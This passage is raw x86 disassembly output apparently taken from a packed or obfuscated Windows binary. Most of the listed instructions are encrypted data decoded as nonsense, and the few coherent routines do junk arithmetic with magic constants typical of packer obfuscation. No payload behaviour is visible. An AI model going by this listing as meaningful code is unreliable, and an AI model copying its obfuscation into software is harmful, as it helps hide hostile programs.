  414a2d:	cmp    eax,0x775ef734
  414a32:	sub    eax,0xac65a8a1
  414a37:	push   ds
  414a38:	and    esi,DWORD PTR [edx-0x36]
  414a3b:	add    eax,0x2295ce71
  414a40:	out    0x74,al
  414a42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a43:	popa   
  414a44:	inc    edx
  414a45:	sbb    BYTE PTR [esi-0x52],al
  414a48:	or     DWORD PTR [ebp-0x49],esi
  414a4b:	xchg   edi,eax
  414a4c:	jecxz  0x4149fd
  414a4e:	xor    DWORD PTR [edx+0x1],edi
  414a51:	mov    bl,al
  414a53:	push   esp
  414a54:	jne    0x414ad1
  414a56:	in     al,dx
  414a57:	imul   ecx,ebp,0x7f
  414a5a:	test   eax,0x52f9696a
  414a5f:	lock sub BYTE PTR ds:0x5c6f78d2,dl
  414a66:	pop    ebx
  414a67:	cs xchg edx,eax
  414a69:	sub    dl,BYTE PTR [eax+0x6c627ae1]
  414a6f:	jne    0x414a23
  414a71:	loope  0x414a6e
  414a73:	push   ss
  414a74:	jno    0x414a51
  414a76:	mov    ds:0x48cbdce,al
  414a7b:	fnsetpm(287 only) 
  414a7d:	sub    al,0xff
  414a7f:	and    DWORD PTR [ebx+0x208398cb],ebx
  414a85:	inc    ebx
  414a86:	shr    ebp,1
  414a88:	stc    
  414a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a8a:	or     BYTE PTR [edx],dl
  414a8c:	push   0x3d
  414a8e:	adc    ebp,ebx
  414a90:	loopne 0x414a66
  414a92:	pop    ss
  414a93:	sub    eax,0xba783e2e
  414a98:	mov    edi,0x56ce87fc
  414a9d:	lock fisttp QWORD PTR [edi-0x711959ea]
  414aa4:	inc    eax
  414aa5:	imul   esi,DWORD PTR [ecx-0x77],0x590d2bb1
  414aac:	mov    al,ds:0xd997c60a
  414ab1:	outs   dx,DWORD PTR ds:[esi]
  414ab2:	stc    
  414ab3:	and    ecx,ecx
  414ab5:	jo     0x414a38
  414ab7:	aad    0xf0
  414ab9:	inc    ecx
  414aba:	or     bh,0x86
  414abd:	ror    DWORD PTR [esi-0x20],0x83
  414ac1:	(bad)  
  414ac2:	sti    
  414ac3:	jnp    0x414a4b
  414ac5:	cdq    
  414ac6:	sbb    DWORD PTR [ebx],ebx
  414ac8:	std    
  414ac9:	repz dec ebp
  414acb:	mov    edi,0xa7c85ff1
  414ad0:	xor    DWORD PTR [ebp*2-0x424a3713],0xd832289b
  414adb:	lahf   
  414adc:	pop    edi
  414add:	sbb    esp,ecx
  414adf:	mov    ebp,0x31131a3b
  414ae4:	xchg   esp,eax
  414ae5:	lea    esp,[ebp-0xf]
  414ae8:	sbb    BYTE PTR [esp+ebp*2+0x2728d148],al
  414aef:	das    
  414af0:	cmc    
  414af1:	fld    DWORD PTR [ebp+ebp*1-0x51]
  414af5:	ins    BYTE PTR es:[edi],dx
  414af6:	retf   0xfb7b
  414af9:	sub    al,0xc
  414afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414afc:	psrld  mm3,QWORD PTR [ebx]
  414aff:	mov    ah,0xe6
  414b01:	inc    esi
  414b02:	stos   BYTE PTR es:[edi],al
  414b03:	les    ebx,FWORD PTR ds:0x6a588b30
  414b09:	mov    eax,ds:0xc749c046
  414b0e:	das    
  414b0f:	imul   esi,DWORD PTR [edx],0xdbb76438
  414b15:	loopne 0x414af3
  414b17:	jmp    0xb11d:0x4fab7e45
  414b1e:	imul   ecx,esp,0x3f
  414b21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b22:	fwait
  414b23:	enter  0x7f0a,0x5f
  414b27:	push   ds
  414b28:	ins    DWORD PTR es:[edi],dx
  414b29:	ja     0x414aac
  414b2b:	push   esi
  414b2c:	mov    dl,0xa2
  414b2e:	xchg   esi,eax
  414b2f:	sbb    BYTE PTR [ecx+0x374b5c89],0x58
  414b36:	xchg   esi,eax
  414b37:	or     eax,0xec9187e9
  414b3c:	and    ax,0xabab
  414b40:	push   esp
  414b41:	push   esp
  414b42:	iret   
  414b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b44:	and    esp,DWORD PTR [ebp-0x1]
  414b47:	sub    al,0xa4
  414b49:	es pop edx
  414b4b:	in     al,dx
  414b4c:	prefetcht2 BYTE PTR [esi-0x47]
  414b50:	jp     0x414b15
  414b52:	ja     0x414b81
  414b54:	fadd   QWORD PTR [ebp+0x31cea9ac]
  414b5a:	lods   eax,DWORD PTR ds:[esi]
  414b5b:	sub    al,bh
  414b5d:	sahf   
  414b5e:	mov    ch,cl
  414b60:	xchg   ecx,eax
  414b61:	xchg   ebp,eax
  414b62:	dec    esp
  414b63:	mov    eax,0x1e31fb8f
  414b68:	retf   
  414b69:	pop    eax
  414b6a:	adc    esi,DWORD PTR [ecx-0x3978a97d]
  414b70:	pushf  
  414b71:	mov    cs:0xd7b80ac3,al
  414b77:	in     eax,0x48
  414b79:	and    al,0x27
  414b7b:	popf   
  414b7c:	sbb    al,0xc6
  414b7e:	and    eax,0x7e0e9ec6
  414b83:	dec    ebp
  414b84:	mov    DWORD PTR [edi-0xc],edi
  414b87:	js     0x414bd8
  414b89:	sbb    bl,dl
  414b8b:	test   al,0x99
  414b8d:	jmp    0x414bfb
  414b8f:	mov    esp,0x47906d93
  414b94:	mov    dl,0x13
  414b96:	clc    
  414b97:	scas   eax,DWORD PTR es:[edi]
  414b98:	aad    0x36
  414b9a:	ins    DWORD PTR es:[edi],dx
  414b9b:	mov    BYTE PTR [eax],bh
  414b9d:	mov    ebp,0xcca52fc0
  414ba2:	pop    edx
  414ba3:	fadd   DWORD PTR [edi+0x7a]
  414ba6:	jecxz  0x414b7e
  414ba8:	jg     0x414c02
  414baa:	in     al,0xc9
  414bac:	jmp    0x414b62
  414bae:	or     DWORD PTR [eax+eiz*1-0x2d5997c7],esp
  414bb5:	hlt    
  414bb6:	pop    ecx
  414bb7:	test   DWORD PTR ds:0x1557bfeb,edx
  414bbd:	sub    eax,0x662c25d7
  414bc2:	and    DWORD PTR [eax],ebx
  414bc4:	xchg   edi,eax
  414bc5:	dec    esi
  414bc6:	hlt    
  414bc7:	xor    bl,bl
  414bc9:	mov    edi,0x20022e4e
  414bce:	mov    bl,0x12
  414bd0:	adc    al,BYTE PTR ds:0xc3f62843
  414bd6:	dec    esp
  414bd7:	pop    esp
  414bd8:	cmp    DWORD PTR [esi],ecx
  414bda:	repnz dec edx
  414bdc:	adc    DWORD PTR [esi-0x596db7ec],edi
  414be2:	xchg   esi,eax
  414be3:	scas   al,BYTE PTR es:[edi]
  414be4:	retf   0xc9af
  414be7:	pushw  ss
  414be9:	sub    esi,DWORD PTR [edi]
  414beb:	inc    ebp
  414bec:	out    0xa4,al
  414bee:	or     BYTE PTR [edi],dh
  414bf0:	sub    DWORD PTR [edi+0x38],edx
  414bf3:	add    DWORD PTR [esi+0x13],0x9
  414bf7:	in     eax,dx
  414bf8:	(bad)  
  414bf9:	jecxz  0x414c22
  414bfb:	mov    bh,0x15
  414bfd:	push   ebp
  414bfe:	adc    BYTE PTR [esi-0xd744cb7],al
  414c04:	lock popf 
  414c06:	xchg   ecx,eax
  414c07:	bound  esp,QWORD PTR ds:0xa29b366a
  414c0d:	inc    edx
  414c0e:	loope  0x414c48
  414c10:	ret    0x33d3
  414c13:	aam    0x59
  414c15:	mov    al,0xdd
  414c17:	or     al,0x86
  414c19:	mov    edx,0x56e962f4
  414c1e:	dec    ebp
  414c1f:	mov    ah,0x1f
  414c21:	push   edx
  414c22:	mov    esp,0xf322466a
  414c27:	rcl    DWORD PTR [ebp-0x52],1
  414c2a:	in     eax,dx
  414c2b:	mov    eax,ds:0x86381af0
  414c30:	jno    0x414bd2
  414c32:	sbb    BYTE PTR [ecx+0x53],cl
  414c35:	(bad)  
  414c36:	(bad)  
  414c37:	fwait
  414c38:	in     eax,dx
  414c39:	imul   esp,DWORD PTR [eax-0x27a20848],0xffffffce
  414c40:	add    edi,0x27
  414c43:	addr16 mov cl,0x1e
  414c46:	inc    esp
  414c47:	stos   DWORD PTR es:[edi],eax
  414c48:	mov    ch,0x71
  414c4a:	pop    edi
  414c4b:	jmp    0xe918846f
  414c50:	not    DWORD PTR [esi+eax*2+0x98a595f]
  414c57:	cdq    
  414c58:	xchg   ebx,eax
  414c59:	in     eax,0x6b
  414c5b:	inc    edi
  414c5c:	les    edi,FWORD PTR [edi+0x260af6d1]
  414c62:	add    edi,DWORD PTR [ecx]
  414c64:	scas   al,BYTE PTR es:[edi]
  414c65:	push   ecx
  414c66:	mov    al,ds:0x85f73b85
  414c6b:	push   cs
  414c6c:	nop
  414c6d:	cmp    DWORD PTR [ecx+0x59],esi
  414c70:	mov    DWORD PTR [eax],edx
  414c72:	stos   DWORD PTR es:[edi],eax
  414c73:	mov    ebp,0xafae2f98
  414c78:	mov    ecx,0xa7319a5a
  414c7d:	or     bh,cl
  414c7f:	pop    esi
  414c80:	out    0x8,eax
  414c82:	sbb    BYTE PTR [ebx-0x237f8aca],al
  414c88:	sub    esp,DWORD PTR [ebp-0x817c9b4]
  414c8e:	xchg   ebp,eax
  414c8f:	cld    
  414c90:	es ins BYTE PTR es:[edi],dx
  414c92:	fcomp  QWORD PTR [edx-0x34]
  414c95:	loopne 0x414c58
  414c97:	arpl   ax,dx
  414c99:	inc    ebx
  414c9a:	sub    esp,DWORD PTR [esi+0x5f694bcb]
  414ca0:	sar    DWORD PTR [esi],0x9e
  414ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca4:	xor    DWORD PTR [esi-0x25],ebx
  414ca7:	xchg   esi,esi
  414ca9:	or     esp,ebp
  414cab:	and    bl,bl
  414cad:	je     0x414cad
  414caf:	dec    eax
  414cb0:	lock xchg edi,eax
  414cb2:	mov    esp,0x7d931238
  414cb7:	cdq    
  414cb8:	and    DWORD PTR [edx+0x33],0x39
  414cbc:	sbb    eax,0x48770a99
  414cc1:	mov    DWORD PTR [ecx+0x6a],edi
  414cc4:	mov    al,0x14
  414cc6:	push   ss
  414cc7:	out    0xd8,al
  414cc9:	mov    ecx,0x758c7da0
  414cce:	jns    0x414ca7
  414cd0:	imul   ebx,DWORD PTR [edx+0x7e17cea5],0xfde924f6
  414cda:	sbb    DWORD PTR [eax],esi
  414cdc:	inc    eax
  414cdd:	mov    ebx,0x5c7ce697
  414ce2:	aad    0x58
  414ce4:	leave  
  414ce5:	xor    esi,edi
  414ce7:	dec    eax
  414ce8:	xchg   ecx,eax
  414ce9:	push   ss
  414cea:	lds    ecx,FWORD PTR [edx]
  414cec:	xchg   edi,eax
  414ced:	dec    ecx
  414cee:	punpcklwd mm7,DWORD PTR [eax]
  414cf1:	adc    al,0x9b
  414cf3:	adc    eax,0x155abc11
  414cf8:	(bad)  
  414cf9:	sbb    al,0x8
  414cfb:	mov    eax,0xe64d9a4c
  414d00:	sub    al,BYTE PTR [edi]
  414d02:	aaa    
  414d03:	jmp    0xccd7c874
  414d08:	mov    WORD PTR [ebp+0x51],ds
  414d0b:	jp     0x414cfc
  414d0d:	add    ebp,ebx
  414d0f:	sbb    DWORD PTR [edx],ecx
  414d11:	repnz shl DWORD PTR [ecx+0x587ff391],cl
  414d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d19:	xor    eax,0x4a449933
  414d1e:	shr    dh,1
  414d20:	inc    ebp
  414d21:	(bad)  
  414d22:	js     0x414d51
  414d24:	add    bh,BYTE PTR fs:[ebp+0x1e473a4]
  414d2b:	outs   dx,BYTE PTR ds:[esi]
  414d2d:	pop    ds
  414d2e:	out    dx,eax
  414d2f:	call   0x9828a3a8
  414d34:	je     0x414d59
  414d36:	sbb    eax,0xd427eea3
  414d3b:	mov    bl,al
  414d3d:	loope  0x414ce0
  414d3f:	lods   al,BYTE PTR ds:[esi]
  414d40:	sbb    al,BYTE PTR ds:0x58673ef7
  414d46:	in     al,dx
  414d47:	add    al,0xf1
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xd9
  414e02:	inc    edi
  414e03:	clc    
  414e04:	push   0x42
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx-0x40e7e7ee],dl
  414e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0f:	mov    ebp,DWORD PTR [eax]
  414e11:	ror    DWORD PTR [eax],1
  414e13:	push   ebx
  414e14:	and    DWORD PTR [ebp+eiz*4+0x6ea417ca],ebx
  414e1b:	int    0x85
  414e1d:	fimul  DWORD PTR [ecx+0x602a69dd]
  414e23:	call   0xb51a:0x4f8ede8e
  414e2a:	loop   0x414e12
  414e2c:	sbb    al,0x56
  414e2e:	inc    ebx
  414e2f:	fcomp  QWORD PTR [ebx-0x14]
  414e32:	in     eax,dx
  414e33:	add    al,0xf1
  414e35:	add    esi,DWORD PTR ds:0xe07a2efd
  414e3b:	frstor [ebx+edi*2]
  414e3e:	pop    eax
  414e3f:	cmp    DWORD PTR ds:0x2b3b44a2,ebx
  414e45:	icebp  
  414e46:	rcr    DWORD PTR [eax+0xf3d2c8],cl
  414e4c:	xor    eax,0xd71b6579
  414e51:	push   esp
  414e52:	fcmovbe st,st(1)
  414e54:	sbb    DWORD PTR [ebx],edx
  414e56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e57:	inc    ecx
  414e58:	cmc    
  414e59:	das    
  414e5a:	js     0x414e80
  414e5c:	mov    ss,WORD PTR ds:0xa125291d
  414e62:	xchg   edi,eax
  414e63:	ins    BYTE PTR es:[edi],dx
  414e64:	mov    bh,BYTE PTR [edi]
  414e66:	xchg   ebx,eax
  414e67:	mov    DWORD PTR [ebx+0x3b34aab6],esi
  414e6d:	sar    BYTE PTR [ecx-0x48],1
  414e70:	jmp    0x7c4db786
  414e75:	add    al,0x8d
  414e77:	into   
  414e78:	xchg   BYTE PTR [eax-0x1e],bl
  414e7b:	mov    eax,ds:0x8582919c
  414e80:	pop    ds
  414e81:	sti    
  414e82:	imul   ebp,ecx,0xffffffe0
  414e85:	loopne 0x414ed4
  414e87:	xchg   ebx,eax
  414e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e8a:	push   ds
  414e8b:	cmp    BYTE PTR [edx-0x3],al
  414e8e:	(bad)  
  414e8f:	xchg   esp,eax
  414e90:	jmp    0x414e41
  414e92:	ret    0xbf8e
  414e95:	(bad)  
  414e97:	jg     0x414e7e
  414e99:	or     BYTE PTR [eax+0x5c31f222],dl
  414e9f:	xor    BYTE PTR [esi],al
  414ea1:	mov    ebp,0x7fe1c67f
  414ea6:	aam    0xcc
  414ea8:	in     al,dx
  414ea9:	std    
  414eaa:	pop    ecx
  414eab:	sub    DWORD PTR [ecx-0x47],0x915be70
  414eb2:	push   es
  414eb3:	outs   dx,BYTE PTR ds:[esi]
  414eb4:	shr    edi,1
  414eb6:	pop    esp
  414eb7:	into   
  414eb8:	pop    ebx
  414eb9:	icebp  
  414eba:	pop    ss
  414ebb:	loopne 0x414ea8
  414ebd:	aas    
  414ebe:	push   edi
  414ebf:	mov    bl,BYTE PTR ds:0x97332d06
  414ec5:	arpl   WORD PTR [ebx+edi*4-0x67],bx
  414ec9:	hlt    
  414eca:	cmp    BYTE PTR [ebp-0x61],0xb8
  414ece:	push   0x974ec7
  414ed3:	pop    edx
  414ed4:	xchg   ebp,eax
  414ed5:	add    bh,BYTE PTR [edx-0x1c6a004e]
  414edb:	jne    0x414f1c
  414edd:	stos   BYTE PTR es:[edi],al
  414ede:	test   esi,ebx
  414ee0:	pushf  
  414ee1:	cli    
  414ee2:	xor    ch,BYTE PTR [ebx+0x3889b7e3]
  414ee8:	stos   BYTE PTR es:[edi],al
  414ee9:	scas   al,BYTE PTR es:[edi]
  414eea:	xor    bh,bh
  414eec:	sbb    edi,DWORD PTR [eax+0x2c465f46]
  414ef2:	mov    ch,0xaf
  414ef4:	inc    esi
  414ef5:	test   eax,0x1f964c21
  414efa:	jl     0x414ebd
  414efc:	sbb    eax,0x222113cb
  414f01:	pop    es
  414f02:	sar    BYTE PTR [ebp-0x3d7866be],cl
  414f08:	stos   DWORD PTR es:[edi],eax
  414f09:	dec    edx
  414f0a:	xchg   ebx,eax
  414f0b:	inc    esp
  414f0c:	mov    esp,0x21e03775
  414f11:	push   ecx
  414f12:	ja     0x414f4e
  414f14:	push   esp
  414f15:	neg    DWORD PTR [ecx-0x51]
  414f18:	xchg   edx,eax
  414f19:	ss jae 0x414eea
  414f1c:	sbb    al,0x42
  414f1e:	mov    ah,0x79
  414f20:	clc    
  414f21:	jle    0x414eb8
  414f23:	sub    ch,BYTE PTR [ebp-0x4a]
  414f26:	jmp    0xe677418
  414f2b:	cld    
  414f2c:	jl     0x414f6c
  414f2e:	or     BYTE PTR [ebp+0x40],cl
  414f31:	and    al,0x96
  414f33:	mov    ebp,0x9809168f
  414f38:	aaa    
  414f39:	mov    ah,0xc8
  414f3b:	xchg   ecx,eax
  414f3c:	xchg   BYTE PTR [esp+eiz*8+0x6468b47f],ah
  414f43:	inc    ebx
  414f44:	sub    BYTE PTR [esi+ecx*8-0x7e257094],ah
  414f4b:	xor    eax,eax
  414f4d:	sbb    bl,bl
  414f4f:	dec    edi
  414f50:	je     0x414fa3
  414f52:	and    dl,ah
  414f54:	mov    eax,ds:0xdf007cb8
  414f59:	aaa    
  414f5a:	sub    BYTE PTR [eax+0x462d37bb],0x26
  414f61:	xchg   edi,eax
  414f62:	mov    edi,0x8579a454
  414f67:	pop    edx
  414f68:	sbb    BYTE PTR [ecx+eiz*1-0x2c43880],dl
  414f6f:	push   0xaf4321c6
  414f74:	pop    ss
  414f75:	jb     0x414fd3
  414f77:	or     edi,eax
  414f79:	and    eax,0x96f8412e
  414f7e:	aad    0x35
  414f80:	cmp    al,0x8
  414f82:	aas    
  414f83:	jge    0x414fb1
  414f85:	dec    ebp
  414f86:	dec    ebx
  414f87:	jl     0x414f7e
  414f89:	jg     0x414f3f
  414f8b:	pusha  
  414f8c:	call   0x6e82ff1b
  414f91:	(bad)  
  414f92:	dec    edx
  414f93:	aas    
  414f94:	retf   0x559c
  414f97:	mov    ch,0x9
  414f99:	push   edi
  414f9a:	data16 xor bl,BYTE PTR [ebp-0x3eb01ad7]
  414fa1:	push   es
  414fa2:	nop
  414fa3:	pushf  
  414fa4:	jp     0x41500c
  414fa6:	and    BYTE PTR ds:0xd0b0d431,bl
  414fac:	clc    
  414fad:	fld    DWORD PTR [esi-0x62]
  414fb0:	bound  ebp,QWORD PTR [edi+0x6a306eb]
  414fb6:	mov    BYTE PTR [esi-0x5a28c69c],0xc1
  414fbd:	out    dx,al
  414fbe:	fdivr  DWORD PTR [ebp-0x46b6f23a]
  414fc4:	pop    ebx
  414fc5:	xchg   ecx,eax
  414fc6:	push   edx
  414fc7:	mov    eax,ds:0xc081b63e
  414fcc:	out    dx,al
  414fcd:	add    BYTE PTR [esi+0x6ffe134f],al
  414fd3:	inc    eax
  414fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fd5:	or     dl,bh
  414fd7:	call   0x32b:0x2ab8a335
  414fde:	adc    BYTE PTR [edi],al
  414fe0:	jae    0x414fee
  414fe2:	mov    edi,0xe2c0b6c5
  414fe7:	jmp    0x582:0x18e27106
  414fee:	pop    ebp
  414fef:	mov    dl,0x98
  414ff1:	jno    0x415057
  414ff3:	mov    WORD PTR [edi],?
  414ff5:	fistp  QWORD PTR [edi-0x565af2e]
  414ffb:	xlat   BYTE PTR ds:[ebx]
  414ffc:	jo     0x414fa1
  414ffe:	sub    al,0xbf
  415000:	jmp    0x3ecb:0x44704710
  415007:	arpl   WORD PTR [esi+0x48e8b548],bx
  41500d:	test   al,0x78
  41500f:	and    al,0xd6
  415011:	and    al,0x14
  415013:	jnp    0x414f9a
  415015:	popa   
  415016:	loope  0x414ff5
  415018:	sub    BYTE PTR [edx+edi*4+0x29],0xce
  41501d:	cmp    al,0xa8
  41501f:	popf   
  415020:	xor    al,0xa
  415022:	scas   al,BYTE PTR es:[edi]
  415023:	retf   0x8012
  415026:	ss sti 
  415028:	daa    
  415029:	inc    edx
  41502a:	inc    esp
  41502b:	ja     0x414fda
  41502d:	pop    ebx
  41502e:	xchg   esp,eax
  41502f:	sbb    eax,esp
  415031:	xchg   ebp,eax
  415032:	das    
  415033:	enter  0xad7e,0x35
  415037:	mov    eax,0x24fc645e
  41503c:	(bad)  [ecx+0x74]
  41503f:	mov    edx,0x1ed3d9c7
  415044:	out    dx,eax
  415045:	add    esp,DWORD PTR [eax+0x3d]
  415048:	rcr    BYTE PTR [ecx],0x7a
  41504b:	arpl   WORD PTR [eax+eax*8],cx
  41504e:	outs   dx,BYTE PTR ds:[esi]
  41504f:	imul   eax,DWORD PTR [ebx-0x4965f986],0x25
  415056:	les    ebx,FWORD PTR [ebp+0x291c853e]
  41505c:	outs   dx,BYTE PTR ds:[esi]
  41505d:	ss ret 
  41505f:	loopne 0x41503c
  415061:	and    DWORD PTR [ebp+0x23c9ec2b],ebp
  415067:	clc    
  415068:	xchg   edx,eax
  415069:	scas   eax,DWORD PTR es:[edi]
  41506a:	jbe    0x41508c
  41506c:	lea    ecx,[esi+0x1e2045f2]
  415072:	inc    eax
  415073:	push   ebp
  415074:	lea    edi,[ebx-0x14c622f5]
  41507a:	jge    0x415024
  41507c:	add    BYTE PTR [edi],0x6b
  41507f:	add    BYTE PTR [edx+ebp*8-0xe510676],dh
  415086:	fldenv [ecx-0x6f]
  415089:	clc    
  41508a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41508b:	imul   esi,ebp,0xffffff97
  41508e:	cmp    BYTE PTR [ecx+eax*8+0x27],bh
  415092:	dec    edi
  415093:	sub    BYTE PTR [eax-0x14],0xbb
  415097:	mov    dl,0x9d
  415099:	jmp    0x4150e0
  41509b:	ja     0x415023
  41509d:	sbb    esp,esi
  41509f:	jno    0x415106
  4150a1:	inc    eax
  4150a2:	sbb    eax,0xfbe2fb61
  4150a7:	sbb    eax,0xa584fde3
  4150ac:	jge    0x4150ea
  4150ae:	stos   BYTE PTR es:[edi],al
  4150af:	in     eax,0x42
  4150b1:	sar    BYTE PTR [esi-0x4e],0x5c
  4150b5:	out    0x49,al
  4150b7:	mov    al,ds:0x6f9780f4
  4150bc:	out    dx,eax
  4150bd:	adc    eax,0x80a2da2f
  4150c2:	mov    edx,0x1a7eed17
  4150c7:	push   edx
  4150c8:	retf   
  4150c9:	test   eax,0x798df913
  4150ce:	scas   eax,DWORD PTR es:[edi]
  4150cf:	jno    0x4150ee
  4150d1:	pop    ebx
  4150d2:	fistp  QWORD PTR [edx+0x631a7d80]
  4150d8:	mov    esp,0xb0ccb741
  4150dd:	cs pop eax
  4150df:	lods   al,BYTE PTR ds:[esi]
  4150e0:	lahf   
  4150e1:	sbb    DWORD PTR [ecx+0x5aec0174],edi
  4150e7:	push   edx
  4150e8:	sub    al,0x7d
  4150ea:	or     al,0x6e
  4150ec:	das    
  4150ed:	mov    ecx,0x611b0b7
  4150f2:	xchg   DWORD PTR [esi],esi
  4150f4:	xor    bl,bl
  4150f6:	or     BYTE PTR [esp+eiz*4+0x5],0xc8
  4150fb:	mov    al,ds:0x3e433542
  415100:	push   edi
  415101:	sbb    eax,DWORD PTR [eax+0x28907f4a]
  415107:	push   eax
  415108:	jle    0x415129
  41510a:	mov    ebp,0x69345df1
  41510f:	jmp    0x94cc:0xa7b04222
  415116:	or     eax,0xd6bfde3e
  41511b:	sub    bl,ah
  41511d:	pop    ds
  41511e:	mov    DWORD PTR [edi+0x76],ebp
  415121:	sub    dh,BYTE PTR [ebp-0x513cbb9]
  415127:	or     cl,BYTE PTR [edi-0x31]
  41512a:	ffree  st(5)
  41512c:	dec    eax
  41512d:	push   ss
  41512e:	or     BYTE PTR [esi+0x42895a18],cl
  415134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415135:	(bad)  
  415136:	aam    0x8
  415138:	fistp  DWORD PTR [ecx*2+0x60aa733d]
  41513f:	xor    ecx,esi
  415141:	push   edi
  415142:	jno    0x415122
  415144:	sub    eax,0xc5d69eae
  415149:	mov    esp,0xc7ee2b83
  41514e:	add    BYTE PTR [ebx+0x66],al
  415151:	xor    DWORD PTR [eax+0xf9952ae],0xfc1cac32
  41515b:	or     eax,0x900a0b07
  415160:	jl     0x415127
  415162:	imul   esi,DWORD PTR gs:[edx-0xd],0xb5f73946
  41516a:	clc    
  41516b:	xchg   esi,eax
  41516c:	and    eax,0x32bf6efc
  415171:	mov    eax,ds:0xb61be676
  415176:	mov    edx,ebp
  415178:	in     al,0xc3
  41517a:	bound  edi,QWORD PTR [eax]
  41517c:	je     0x415193
  41517e:	xchg   ebp,eax
  41517f:	xor    DWORD PTR ss:[esi],edx
  415182:	loopne 0x415201
  415184:	popw   ss
  415186:	and    eax,0xb8f654ef
  41518b:	pop    esp
  41518c:	or     eax,0x7bee9e25
  415191:	jmp    0x415207
  415193:	push   0x6cb5d2c8
  415198:	jnp    0x4151d2
  41519a:	loopne 0x4151f3
  41519c:	xor    eax,0x1b6685c1
  4151a1:	push   ebp
  4151a2:	sbb    BYTE PTR [edx],bh
  4151a4:	jmp    0x41514b
  4151a6:	push   ss
  4151a7:	loope  0x4151d8
  4151a9:	cld    
  4151aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151ab:	mov    bh,0x50
  4151ad:	pop    ds
  4151ae:	mov    esp,0x4d369219
  4151b3:	ret    
  4151b4:	jae    0x41521c
  4151b6:	pop    ecx
  4151b7:	es std 
  4151b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ba:	imul   esi,eax,0x24f19d3a
  4151c0:	fs push edx
  4151c2:	xchg   esp,eax
  4151c3:	fisttp DWORD PTR [edx+0x28d5861b]
  4151c9:	ret    
  4151ca:	fimul  WORD PTR [ecx+0x54]
  4151cd:	pushf  
  4151ce:	push   es
  4151cf:	test   al,cl
  4151d1:	push   ss
  4151d2:	and    BYTE PTR [eax+0x1424548b],bl
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
